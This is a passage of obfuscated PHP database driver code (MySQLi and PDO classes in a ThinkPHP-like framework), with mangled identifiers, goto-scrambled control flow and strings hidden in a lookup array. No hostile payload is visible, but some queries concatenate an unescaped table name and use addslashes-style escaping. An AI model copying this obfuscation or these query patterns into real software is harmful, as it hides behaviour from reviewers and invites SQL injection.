LNG($fÏÀƒàó[45]) . $this->queryStr; } think_trace($this->error, $fÏÀƒàó[33], $fÏÀƒàó[46]); return $this->error; } public function escapeString($Eö“ÜÈ±ÕÁ) { if ($this->_linkID) { return mysql_real_escape_string($Eö“ÜÈ±ÕÁ, $this->_linkID); } else { return mysql_escape_string($Eö“ÜÈ±ÕÁ); } } public function parseKey(&$CŠ¿ğ•š±î, $B–³¿òñæ = true) { $A²…ÅîÚ¬· =& $_SERVER[÷ÖêïÔÔÓ]; if ($B–³¿òñæ) { $CŠ¿ğ•š±î = $this->parseKeyCheck($CŠ¿ğ•š±î); } if ($CŠ¿ğ•š±î != $A²…ÅîÚ¬·[173] && !preg_match($A²…ÅîÚ¬·[818], $CŠ¿ğ•š±î)) { $CŠ¿ğ•š±î = $A²…ÅîÚ¬·[819] . trim($CŠ¿ğ•š±î, $A²…ÅîÚ¬·[819]) . $A²…ÅîÚ¬·[819]; } return $CŠ¿ğ•š±î; } } class DbMysqli extends Db { public function __construct($B‡‘²é° = '') { $BÁ‘Ø¢Ö =& $_SERVER[÷ÖêïÔÔÓ]; if (!extension_loaded($BÁ‘Ø¢Ö[820])) { think_exception(think_lang($BÁ‘Ø¢Ö[10]) . $BÁ‘Ø¢Ö[821]); } if (!empty($B‡‘²é°)) { $this->config = $B‡‘²é°; if (empty($this->config[$BÁ‘Ø¢Ö[13]])) { $this->config[$BÁ‘Ø¢Ö[13]] = $BÁ‘Ø¢Ö[33]; } } } public function connect($cÄ¼İ·Â‡¾ = '', $b‘İÕÂˆÈ¯ = 0) { $DÊÎäÓìÂˆ =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($this->linkID[$b‘İÕÂˆÈ¯])) { goto BÓ¢æ“¦Ç‘; Aë­ Ü“ƒ‹: $this->connected = !0; if (1 != think_config($DÊÎäÓìÂˆ[18])) { unset($this->config); } goto e÷ËĞ†êÕœ; C‰Ú­¦·¼…: $cİàÀ¸ôÃÂ = $this->linkID[$b‘İÕÂˆÈ¯]->server_version; $this->linkID[$b‘İÕÂˆÈ¯]->query($DÊÎäÓìÂˆ[798] . think_config($DÊÎäÓìÂˆ[799]) . $DÊÎäÓìÂˆ[55]); if ($cİàÀ¸ôÃÂ > $DÊÎäÓìÂˆ[800]) { $this->linkID[$b‘İÕÂˆÈ¯]->query($DÊÎäÓìÂˆ[801]); } goto Aë­ Ü“ƒ‹; BÓ¢æ“¦Ç‘: if (empty($cÄ¼İ·Â‡¾)) { $cÄ¼İ·Â‡¾ = $this->config; } $this->linkID[$b‘İÕÂˆÈ¯] = new mysqli($cÄ¼İ·Â‡¾[$DÊÎäÓìÂˆ[794]], $cÄ¼İ·Â‡¾[$DÊÎäÓìÂˆ[796]], $cÄ¼İ·Â‡¾[$DÊÎäÓìÂˆ[797]], $cÄ¼İ·Â‡¾[$DÊÎäÓìÂˆ[17]], $cÄ¼İ·Â‡¾[$DÊÎäÓìÂˆ[795]] ? intval($cÄ¼İ·Â‡¾[$DÊÎäÓìÂˆ[795]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto C‰Ú­¦·¼…; e÷ËĞ†êÕœ: } return $this->linkID[$b‘İÕÂˆÈ¯]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Bß÷ØÚîÜ¦) { goto dÁöÉ°¬çã; cé©ãôïï : think_status($A„…”øŞÓ[20]); $this->queryID = $this->_linkID->query($Bß÷ØÚîÜ¦); if ($this->_linkID->more_results()) { while (($FÜŞŒè¶Œµ = $this->_linkID->next_result()) != NULL) { $FÜŞŒè¶Œµ->free_result(); } } goto C×íñª†øó; Còªè¸‹ØÔ: $this->queryStr = $Bß÷ØÚîÜ¦; if ($this->queryID) { $this->free(); } think_action_status($A„…”øŞÓ[19], 1); goto cé©ãôïï ; C×íñª†øó: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Dõƒ ®†î; dÁöÉ°¬çã: $A„…”øŞÓ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Còªè¸‹ØÔ; Dõƒ ®†î: } public function execute($fñÚØÈÃ¸) { goto Eéê øƒõ; eë±ªÀ†£’: $this->queryStr = $fñÚØÈÃ¸; if ($this->queryID) { $this->free(); } think_action_status($EÒÛ‰Á´[21], 1); goto eœ‘éŒ³ĞÊ; Eéê øƒõ: $EÒÛ‰Á´ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eë±ªÀ†£’; bù‚¨º°–œ: if (!1 === $B¸ğ”§µ§æ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto B¬ÇÇİ­ó³; eœ‘éŒ³ĞÊ: think_status($EÒÛ‰Á´[20]); $B¸ğ”§µ§æ = $this->_linkID->query($fñÚØÈÃ¸); $this->debug(); goto bù‚¨º°–œ; B¬ÇÇİ­ó³: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dáù³éÂˆ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$dáù³éÂˆ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $DÖŒ ¿áó¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$DÖŒ ¿áó¤) { $this->error(); return !1; } } return !0; } private function getAll() { $DÛ›²†…Ôæ = array(); if ($this->numRows > 0) { for ($fŒÆÓè¸¡… = 0; $fŒÆÓè¸¡… < $this->numRows; $fŒÆÓè¸¡…++) { $DÛ›²†…Ôæ[$fŒÆÓè¸¡…] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $DÛ›²†…Ôæ; } public function getFields($DŠŠ™öÔ‚) { $a®›ÃÖèˆ„ =& $_SERVER[÷ÖêïÔÔÓ]; $CÏÇºñ¥ = $this->query($a®›ÃÖèˆ„[805] . $this->parseKey($DŠŠ™öÔ‚)); $DÜâ˜œŸì³ = array(); if ($CÏÇºñ¥) { foreach ($CÏÇºñ¥ as $d‘‚‡‘ÛÍ => $C¬¤Àó¨Ò) { $DÜâ˜œŸì³[$C¬¤Àó¨Ò[$a®›ÃÖèˆ„[27]]] = array($a®›ÃÖèˆ„[28] => $C¬¤Àó¨Ò[$a®›ÃÖèˆ„[27]], $a®›ÃÖèˆ„[29] => $C¬¤Àó¨Ò[$a®›ÃÖèˆ„[30]], $a®›ÃÖèˆ„[31] => (bool) ($C¬¤Àó¨Ò[$a®›ÃÖèˆ„[32]] === $a®›ÃÖèˆ„[33]), $a®›ÃÖèˆ„[34] => $C¬¤Àó¨Ò[$a®›ÃÖèˆ„[35]], $a®›ÃÖèˆ„[36] => strtolower($C¬¤Àó¨Ò[$a®›ÃÖèˆ„[37]]) == $a®›ÃÖèˆ„[38], $a®›ÃÖèˆ„[39] => strtolower($C¬¤Àó¨Ò[$a®›ÃÖèˆ„[40]]) == $a®›ÃÖèˆ„[41]); } } return $DÜâ˜œŸì³; } public function getTables($Aª‹¶Ú‚›ó = '') { $fóâÊÇ¼ŞÛ =& $_SERVER[÷ÖêïÔÔÓ]; $bµµÂ÷…† = !empty($Aª‹¶Ú‚›ó) ? $fóâÊÇ¼ŞÛ[807] . $Aª‹¶Ú‚›ó : $fóâÊÇ¼ŞÛ[808]; $A š¢ƒš”Š = $this->query($bµµÂ÷…†); $bøÛ®™¶‰À = array(); if ($A š¢ƒš”Š) { foreach ($A š¢ƒš”Š as $dîˆÏøš => $Bì‰‰«¬×í) { $bøÛ®™¶‰À[$dîˆÏøš] = current($Bì‰‰«¬×í); } } return $bøÛ®™¶‰À; } public function replace($e×ˆ£†¼Ã, $cÃ´ÀÇœÃ¨ = array()) { $e÷ø¬¤†¦ =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($e×ˆ£†¼Ã as $a‹Èš ÙğÏ => $eŠ…‹Û‹µÆ) { $AÇš¨ˆ…İ½ = $this->parseValue($eŠ…‹Û‹µÆ); if (is_scalar($AÇš¨ˆ…İ½)) { $E‚ èÚÍ©[] = $AÇš¨ˆ…İ½; $Bñçª’«Â[] = $this->parseKey($a‹Èš ÙğÏ); } } $Cà´„äç†’ = $e÷ø¬¤†¦[809] . $this->parseTable($cÃ´ÀÇœÃ¨[$e÷ø¬¤†¦[264]]) . $e÷ø¬¤†¦[810] . implode($e÷ø¬¤†¦[47], $Bñçª’«Â) . $e÷ø¬¤†¦[811] . implode($e÷ø¬¤†¦[47], $E‚ èÚÍ©) . $e÷ø¬¤†¦[812]; return $this->execute($Cà´„äç†’); } public function insertAll($bŠÎïˆ¯çØ, $d¾æÎ½‰ö = array(), $Cø­ƒ˜äÓò = false) { goto aí‹¬®›°Ë; aí‹¬®›°Ë: $Có‚àÀŒª† =& $_SERVER[÷ÖêïÔÔÓ]; if (!is_array($bŠÎïˆ¯çØ[0])) { return !1; } $fŠ­õËË¬ = array_keys($bŠÎïˆ¯çØ[0]); goto fîÂ‹‚ÉÕŠ; fîÂ‹‚ÉÕŠ: $Fè®ëÃ¾Ó‚ = array(); foreach ($bŠÎïˆ¯çØ as $FíÅ×Àæ”š) { $CŸƒº¨™Û = array(); foreach ($FíÅ×Àæ”š as $d×®¸·´— => $CÅçó˜‹¶â) { $CÅçó˜‹¶â = $this->parseValue($CÅçó˜‹¶â); if (is_scalar($CÅçó˜‹¶â)) { $CŸƒº¨™Û[] = $CÅçó˜‹¶â; } } $Fè®ëÃ¾Ó‚[] = $Có‚àÀŒª†[245] . implode($Có‚àÀŒª†[47], $CŸƒº¨™Û) . $Có‚àÀŒª†[812]; } array_walk($fŠ­õËË¬, array($this, $Có‚àÀŒª†[813])); goto AĞïî…¥Ğ½; AĞïî…¥Ğ½: $Cç¼µáãÒ‹ = ($Cø­ƒ˜äÓò ? $Có‚àÀŒª†[814] : $Có‚àÀŒª†[815]) . $Có‚àÀŒª†[816] . $this->parseTable($d¾æÎ½‰ö[$Có‚àÀŒª†[264]]) . $Có‚àÀŒª†[810] . implode($Có‚àÀŒª†[47], $fŠ­õËË¬) . $Có‚àÀŒª†[817] . implode($Có‚àÀŒª†[47], $Fè®ëÃ¾Ó‚); return $this->execute($Cç¼µáãÒ‹); goto F° ‹±Ğ; F° ‹±Ğ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eÈïñèä‘× =& $_SERVER[÷ÖêïÔÔÓ]; $this->error = $this->_linkID->errno . $eÈïñèä‘×[4] . $this->_linkID->error; if ($eÈïñèä‘×[33] != $this->queryStr) { $this->error .= LNG($eÈïñèä‘×[45]) . $this->queryStr; } think_trace($this->error, $eÈïñèä‘×[33], $eÈïñèä‘×[46]); return $this->error; } public function escapeString($eã¬ªóÔ¦‚) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eã¬ªóÔ¦‚); } else { return addslashes($eã¬ªóÔ¦‚); } } public function parseKey(&$Fªˆ¥ôŠÆ, $c–Áæ­Ú = true) { $fšŠ•¸…Ğ =& $_SERVER[÷ÖêïÔÔÓ]; if ($c–Áæ­Ú) { $Fªˆ¥ôŠÆ = $this->parseKeyCheck($Fªˆ¥ôŠÆ); } if ($Fªˆ¥ôŠÆ != $fšŠ•¸…Ğ[173] && !preg_match($fšŠ•¸…Ğ[818], $Fªˆ¥ôŠÆ)) { $Fªˆ¥ôŠÆ = $fšŠ•¸…Ğ[819] . trim($Fªˆ¥ôŠÆ, $fšŠ•¸…Ğ[819]) . $fšŠ•¸…Ğ[819]; } return $Fªˆ¥ôŠÆ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C¿åºß”ÚË = '') { $bäê³Ğ†ğ› =& $_SERVER[÷ÖêïÔÔÓ]; if (!class_exists($bäê³Ğ†ğ›[822])) { think_exception(think_lang($bäê³Ğ†ğ›[10]) . $bäê³Ğ†ğ›[823]); } if (!empty($C¿åºß”ÚË)) { $this->config = $C¿åºß”ÚË; if (empty($this->config[$bäê³Ğ†ğ›[13]])) { $this->config[$bäê³Ğ†ğ›[13]] = array(); } } } public function connect($aŠÌøÈ‚ = '', $Fˆ»¹šÑ—ª = 0) { $cÔŞíÆÖĞ =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($this->linkID[$Fˆ»¹šÑ—ª])) { goto BÀò¤…ô®; e”ç—ÕÍÏ: $this->dbType = $this->_getDsnType($aŠÌøÈ‚[$cÔŞíÆÖĞ[824]]); if (in_array($this->dbType, array($cÔŞíÆÖĞ[825], $cÔŞíÆÖĞ[826], $cÔŞíÆÖĞ[827], $cÔŞíÆÖĞ[828]))) { think_exception($cÔŞíÆÖĞ[829] . $this->dbType . $cÔŞíÆÖĞ[830] . $this->dbType . $cÔŞíÆÖĞ[831]); } if (!$this->linkID[$Fˆ»¹šÑ—ª]) { think_exception($cÔŞíÆÖĞ[832]); } goto dŞÌ¼×ù¥è; dŞÌ¼×ù¥è: $this->linkID[$Fˆ»¹šÑ—ª]->exec($cÔŞíÆÖĞ[833] . think_config($cÔŞíÆÖĞ[799])); $this->connected = !0; if (1 != think_config($cÔŞíÆÖĞ[18])) { unset($this->config); } goto CïêÎíÉ; BÀò¤…ô®: if (empty($aŠÌøÈ‚)) { $aŠÌøÈ‚ = $this->config; } if ($this->pconnect) { $aŠÌøÈ‚[$cÔŞíÆÖĞ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Fˆ»¹šÑ—ª] = new PDO($aŠÌøÈ‚[$cÔŞíÆÖĞ[824]], $aŠÌøÈ‚[$cÔŞíÆÖĞ[796]], $aŠÌøÈ‚[$cÔŞíÆÖĞ[797]], $aŠÌøÈ‚[$cÔŞíÆÖĞ[13]]); } catch (PDOException $C’ôïïË¡ë) { think_exception($C’ôïïË¡ë->getMessage()); } goto e”ç—ÕÍÏ; CïêÎíÉ: } return $this->linkID[$Fˆ»¹šÑ—ª]; } public function free() { $this->PDOStatement = null; } public function query($c†ÄÑÔá©‘, $e†˜­Ê‚ˆ = array()) { goto DÒ­§¢‚¾È; DÒ­§¢‚¾È: $f…ñœº¢² =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D‚èÑËÉ¥; e°»âß…Å: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $fƒÜí‚³¥ = $this->PDOStatement->execute($e†˜­Ê‚ˆ); $this->debug(); goto A½„ö¡æ¢Ú; eˆööØæì: think_action_status($f…ñœº¢²[19], 1); think_status($f…ñœº¢²[20]); $this->PDOStatement = $this->_linkID->prepare($c†ÄÑÔá©‘); goto e°»âß…Å; A½„ö¡æ¢Ú: if (!1 === $fƒÜí‚³¥) { $this->error(); return !1; } else { return $this->getAll(); } goto E³Š‡Ô­Ôˆ; D‚èÑËÉ¥: $this->queryStr = $c†ÄÑÔá©‘; if (!empty($e†˜­Ê‚ˆ)) { $this->queryStr .= $f…ñœº¢²[834] . print_r($e†˜­Ê‚ˆ, !0) . $f…ñœº¢²[835]; } if (!empty($this->PDOStatement)) { $this->free(); } goto eˆööØæì; E³Š‡Ô­Ôˆ: } public function execute($DŠ¸»ù˜, $d“©¯ª¿× = array()) { goto E›»îĞµì¥; E›»îĞµì¥: $dÇà½·‰À­ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÙ”Ğ‹ì¯º; cŞÈñ¶ŞÆ«: if ($this->dbType == $dÇà½·‰À­[828]) { if (preg_match($dÇà½·‰À­[836], $this->queryStr, $f®‚ƒ©ê£…)) { $this->table = think_config($dÇà½·‰À­[837]) . str_ireplace(think_config($dÇà½·‰À­[838]), $dÇà½·‰À­[358], $f®‚ƒ©ê£…[2]); $d È÷Ñïø = (bool) $this->query($dÇà½·‰À­[839] . strtoupper($this->table) . $dÇà½·‰À­[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($dÇà½·‰À­[21], 1); goto D–èÛ³ß‡Á; Dã¿Œí©Ö: $BÊ‰Ò¡©¼… = $this->PDOStatement->execute($d“©¯ª¿×); $this->debug(); if (!1 === $BÊ‰Ò¡©¼…) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($d È÷Ñïø || preg_match($dÇà½·‰À­[840], $DŠ¸»ù˜)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Fº‡¶ƒéˆî; D–èÛ³ß‡Á: think_status($dÇà½·‰À­[20]); $this->PDOStatement = $this->_linkID->prepare($DŠ¸»ù˜); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto Dã¿Œí©Ö; BÙ”Ğ‹ì¯º: $this->queryStr = $DŠ¸»ù˜; if (!empty($d“©¯ª¿×)) { $this->queryStr .= $dÇà½·‰À­[834] . print_r($d“©¯ª¿×, !0) . $dÇà½·‰À­[835]; } $d È÷Ñïø = !1; goto cŞÈñ¶ŞÆ«; Fº‡¶ƒéˆî: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f˜¨‚‹Öàæ = $this->_linkID->commit(); $this->transTimes = 0; if (!$f˜¨‚‹Öàæ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C˜–«ˆŸÎÍ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$C˜–«ˆŸÎÍ) { $this->error(); return !1; } } return !0; } private function getAll() { $aÌ±Ï¹íĞ¥ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($aÌ±Ï¹íĞ¥); return $aÌ±Ï¹íĞ¥; } public function getFields($E±¶àïøï³) { goto fÓ×¯ç‚ä; e‡ìÉ»•Éí: $FŠ¶’×­ĞÎ = $this->query($EÉÙ¶É÷‰); $bÃÌ¨©Š–ù = array(); if ($FŠ¶’×­ĞÎ) { foreach ($FŠ¶’×­ĞÎ as $aŸ¿ì»èèÀ => $E™˜Õ‰Êù) { $E™˜Õ‰Êù = array_change_key_case($E™˜Õ‰Êù); $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[28]] = isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[28]]) ? $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[28]] : $A¦Ü†ë¦îŠ[358]; $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[29]] = isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[29]]) ? $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[29]] : $A¦Ü†ë¦îŠ[358]; $d£ã–Ãš›Ñ = isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[258]]) ? $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[258]] : $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[28]]; $bÃÌ¨©Š–ù[$d£ã–Ãš›Ñ] = array($A¦Ü†ë¦îŠ[28] => $d£ã–Ãš›Ñ, $A¦Ü†ë¦îŠ[29] => $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[29]], $A¦Ü†ë¦îŠ[31] => (bool) (isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[100]]) && $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[100]] === $A¦Ü†ë¦îŠ[33] || isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[31]]) && $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[31]] === $A¦Ü†ë¦îŠ[33]), $A¦Ü†ë¦îŠ[34] => isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[34]]) ? $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[34]] : (isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[53]]) ? $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[53]] : $A¦Ü†ë¦îŠ[358]), $A¦Ü†ë¦îŠ[36] => isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[88]]) ? strtolower($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[88]]) == $A¦Ü†ë¦îŠ[38] : (isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[54]]) ? $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[54]] : !1), $A¦Ü†ë¦îŠ[39] => isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[857]]) ? strtolower($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[857]]) == $A¦Ü†ë¦îŠ[41] : (isset($E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[88]]) ? $E™˜Õ‰Êù[$A¦Ü†ë¦îŠ[88]] : !1)); } } goto E„¯ØùØË; fÓ×¯ç‚ä: $A¦Ü†ë¦îŠ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!0); if (think_config($A¦Ü†ë¦îŠ[841])) { $EÉÙ¶É÷‰ = str_replace($A¦Ü†ë¦îŠ[842], $E±¶àïøï³, think_config($A¦Ü†ë¦îŠ[841])); } else { switch ($this->dbType) { case $A¦Ü†ë¦îŠ[825]: case $A¦Ü†ë¦îŠ[843]: $EÉÙ¶É÷‰ = "\x53\105\114\x45\103\124\x20\40\x20\143\157\154\x75\x6d\x6e\137\x6e\141\x6d\145\40\141\x73\40\47\116\x61\155\x65\x27\54\x20\x20\40\x64\x61\164\x61\x5f\x74\171\x70\x65\x20\141\163\x20\47\124\x79\x70\x65\x27\x2c\x20\x20\40\x63\157\154\165\155\x6e\137\x64\x65\146\x61\x75\154\164\40\x61\163\40\47\104\x65\146\141\165\x6c\x74\x27\54\40\40\40\x69\163\x5f\156\x75\154\x6c\x61\142\x6c\x65\x20\x61\x73\x20\x27\x4e\165\x6c\154\47\xa\11\x9\x46\x52\x4f\115\x9\x69\x6e\146\157\162\155\x61\164\151\x6f\x6e\137\x73\x63\x68\x65\x6d\141\x2e\x74\141\142\x6c\145\163\40\101\x53\40\164\12\x9\11\x4a\117\x49\x4e\11\x69\x6e\146\157\162\x6d\x61\164\x69\x6f\x6e\137\x73\143\150\145\x6d\x61\56\x63\x6f\x6c\x75\155\156\163\x20\x41\123\x20\x63\12\11\11\117\116\x20\x20\164\x2e\164\141\142\x6c\x65\x5f\x63\x61\x74\x61\154\157\x67\x20\75\x20\x63\x2e\x74\x61\142\x6c\x65\137\x63\x61\x74\x61\x6c\157\x67\12\x9\11\101\116\104\x20\x74\x2e\x74\141\x62\154\x65\137\163\x63\150\145\x6d\x61\40\75\40\x63\56\x74\141\142\x6c\145\137\163\x63\x68\x65\x6d\x61\xa\x9\x9\x41\x4e\x44\40\x74\56\164\x61\142\154\145\x5f\156\141\x6d\x65\40\75\40\143\56\x74\141\x62\x6c\x65\137\x6e\x61\x6d\145\xa\11\11\127\110\x45\122\105\40\x20\40\164\x2e\x74\141\142\x6c\145\x5f\156\141\x6d\x65\x20\x3d\x20\47{$E±¶àïøï³}\47"; break; case $A¦Ü†ë¦îŠ[844]: $EÉÙ¶É÷‰ = $A¦Ü†ë¦îŠ[845] . $E±¶àïøï³ . $A¦Ü†ë¦îŠ[846]; break; case $A¦Ü†ë¦îŠ[826]: case $A¦Ü†ë¦îŠ[828]: $EÉÙ¶É÷‰ = $A¦Ü†ë¦îŠ[847] . $A¦Ü†ë¦îŠ[848] . $A¦Ü†ë¦îŠ[849] . strtoupper($E±¶àïøï³) . $A¦Ü†ë¦îŠ[850] . strtoupper($E±¶àïøï³) . $A¦Ü†ë¦îŠ[851]; break; case $A¦Ü†ë¦îŠ[852]: $EÉÙ¶É÷‰ = $A¦Ü†ë¦îŠ[853] . $E±¶àïøï³ . $A¦Ü†ë¦îŠ[854]; break; case $A¦Ü†ë¦îŠ[827]: break; case $A¦Ü†ë¦îŠ[855]: default: $EÉÙ¶É÷‰ = $A¦Ü†ë¦îŠ[856] . ($this->dbType == $A¦Ü†ë¦îŠ[855] ? "\x60{$E±¶àïøï³}\x60" : $E±¶àïøï³); } } goto e‡ìÉ»•Éí; E„¯ØùØË: return $bÃÌ¨©Š–ù; goto EÇõÃö•¹; EÇõÃö•¹: } public function getTables($C©±£×ğ» = '') { $bëÖ”Åæ =& $_SERVER[÷ÖêïÔÔÓ]; if (think_config($bëÖ”Åæ[858])) { $Fè…ÒÖ”‡ô = str_replace($bëÖ”Åæ[859], $C©±£×ğ», think_config($bëÖ”Åæ[858])); } else { switch ($this->dbType) { case $bëÖ”Åæ[826]: case $bëÖ”Åæ[828]: $Fè…ÒÖ”‡ô = $bëÖ”Åæ[860]; break; case $bëÖ”Åæ[825]: case $bëÖ”Åæ[843]: $Fè…ÒÖ”‡ô = $bëÖ”Åæ[861]; break; case $bëÖ”Åæ[852]: $Fè…ÒÖ”‡ô = $bëÖ”Åæ[862]; break; case $bëÖ”Åæ[827]: think_exception(think_lang($bëÖ”Åæ[863]) . $bëÖ”Åæ[864]); break; case $bëÖ”Åæ[844]: $Fè…ÒÖ”‡ô = $bëÖ”Åæ[42] . $bëÖ”Åæ[43] . $bëÖ”Åæ[44]; break; case $bëÖ”Åæ[855]: default: if (!empty($C©±£×ğ»)) { $Fè…ÒÖ”‡ô = $bëÖ”Åæ[807] . $C©±£×ğ»; } else { $Fè…ÒÖ”‡ô = $bëÖ”Åæ[808]; } } } $f—––©ÆÕ³ = $this->query($Fè…ÒÖ”‡ô); $eÅÄ‹§‹² = array(); foreach ($f—––©ÆÕ³ as $b‘‚°ùÙİ  => $EßÎ³ß©Æ) { $eÅÄ‹§‹²[$b‘‚°ùÙİ ] = current($EßÎ³ß©Æ); } return $eÅÄ‹§‹²; } protected function parseLimit($cÄÄËß¨á‘) { $a£ò·¦ˆ¯‹ =& $_SERVER[÷ÖêïÔÔÓ]; $A‡äá³âõ¨ = $a£ò·¦ˆ¯‹[33]; if (!empty($cÄÄËß¨á‘)) { switch ($this->dbType) { case $a£ò·¦ˆ¯‹[852]: case $a£ò·¦ˆ¯‹[844]: $cÄÄËß¨á‘ = explode($a£ò·¦ˆ¯‹[47], $cÄÄËß¨á‘); if (count($cÄÄËß¨á‘) > 1) { $A‡äá³âõ¨ .= $a£ò·¦ˆ¯‹[48] . $cÄÄËß¨á‘[1] . $a£ò·¦ˆ¯‹[49] . $cÄÄËß¨á‘[0] . $a£ò·¦ˆ¯‹[50]; } else { $A‡äá³âõ¨ .= $a£ò·¦ˆ¯‹[48] . $cÄÄËß¨á‘[0] . $a£ò·¦ˆ¯‹[50]; } break; case $a£ò·¦ˆ¯‹[825]: case $a£ò·¦ˆ¯‹[843]: break; case $a£ò·¦ˆ¯‹[827]: break; case $a£ò·¦ˆ¯‹[826]: case $a£ò·¦ˆ¯‹[828]: break; case $a£ò·¦ˆ¯‹[855]: default: $A‡äá³âõ¨ .= $a£ò·¦ˆ¯‹[48] . $cÄÄËß¨á‘ . $a£ò·¦ˆ¯‹[50]; } } return $A‡äá³âõ¨; } public function parseKey(&$f“¡ÆÚÉòƒ, $cÌƒ“œ ‚¡ = true) { $AŒÀ¶ƒ÷²¥ =& $_SERVER[÷ÖêïÔÔÓ]; if ($cÌƒ“œ ‚¡) { $f“¡ÆÚÉòƒ = $this->parseKeyCheck($f“¡ÆÚÉòƒ); } if ($this->dbType == $AŒÀ¶ƒ÷²¥[855]) { if ($f“¡ÆÚÉòƒ != $AŒÀ¶ƒ÷²¥[173] && !preg_match($AŒÀ¶ƒ÷²¥[818], $f“¡ÆÚÉòƒ)) { $f“¡ÆÚÉòƒ = $AŒÀ¶ƒ÷²¥[819] . trim($f“¡ÆÚÉòƒ, $AŒÀ¶ƒ÷²¥[819]) . $AŒÀ¶ƒ÷²¥[819]; } return $f“¡ÆÚÉòƒ; } else { return parent::parseKey($f“¡ÆÚÉòƒ); } } public function close() { $this->_linkID = null; } public function error() { $EÚ×¶ÑŞ¿È =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->PDOStatement) { $FŞÓÍ°à¸ = $this->PDOStatement->errorInfo(); $this->error = $FŞÓÍ°à¸[1] . $EÚ×¶ÑŞ¿È[4] . $FŞÓÍ°à¸[2]; } else { $this->error = $EÚ×¶ÑŞ¿È[33]; } if ($EÚ×¶ÑŞ¿È[33] != $this->queryStr) { $this->error .= LNG($EÚ×¶ÑŞ¿È[45]) . $this->queryStr; } think_trace($this->error, $EÚ×¶ÑŞ¿È[33], $EÚ×¶ÑŞ¿È[46]); return $this->error; } public function escapeString($A°‚Ÿóø…ê) { $cì§„Ù =& $_SERVER[÷ÖêïÔÔÓ]; switch ($this->dbType) { case $cì§„Ù[852]: case $cì§„Ù[825]: case $cì§„Ù[843]: case $cì§„Ù[855]: return addslashes($A°‚Ÿóø…ê); case $cì§„Ù[827]: case $cì§„Ù[844]: case $cì§„Ù[826]: case $cì§„Ù[828]: return str_ireplace($cì§„Ù[55], $cì§„Ù[56], $A°‚Ÿóø…ê); } } protected function parseValue($bğ—¬™ŞÎ³) { $f³±á–†¾ƒ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_string($bğ—¬™ŞÎ³)) { $bğ—¬™ŞÎ³ = strpos($bğ—¬™ŞÎ³, $f³±á–†¾ƒ[4]) === 0 ? $this->escapeString($bğ—¬™ŞÎ³) : $f³±á–†¾ƒ[865] . $this->escapeString($bğ—¬™ŞÎ³) . $f³±á–†¾ƒ[865]; } elseif (isset($bğ—¬™ŞÎ³[0]) && is_string($bğ—¬™ŞÎ³[0]) && strtolower($bğ—¬™ŞÎ³[0]) == $f³±á–†¾ƒ[282]) { 